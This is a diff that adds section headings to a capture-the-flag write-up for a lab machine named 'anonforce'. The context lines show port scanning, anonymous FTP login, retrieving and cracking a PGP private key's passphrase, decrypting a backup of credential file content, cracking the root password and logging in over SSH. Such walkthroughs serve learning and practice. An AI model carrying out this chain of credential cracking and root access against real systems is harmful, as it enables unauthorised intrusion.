@@ -62,6 +62,7 @@ $ rustscan -a anonforce.thm -r 1-65535 --ulimit 5000 -- -sC -sV
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Anonymous FTP login
 We can connect via FTP with anonymous:anonymous and get the user flag
 ```bash
 $ ftp anonforce.thm
@@ -82,6 +83,7 @@ c150 Here comes the directory listing.
 ftp> get user.txt
 ```
 
+## PGP key 
 Further inspection reveals this interesting writeable directory with 2 files
 ```bash
 ftp> cd notread
@@ -94,6 +96,7 @@ ftp> ls
 226 Directory send OK.
 ```
 
+## Cracking the passphrase
 I've tried to import the key, but it requires a passphrase
 ```bash
 gpg --import private.asc
@@ -150,6 +153,7 @@ gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
 
 ```
 
+## Cracking the password for root
 We can view its content now, looks like we got the /etc/passwd file
 ```bash
 $ cat  backup.txt
@@ -204,6 +208,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
+## Connecting via SSH
 Finally, we connect with SSH and get the root flag
 ```bash
 $ ssh root@anonforce.thm
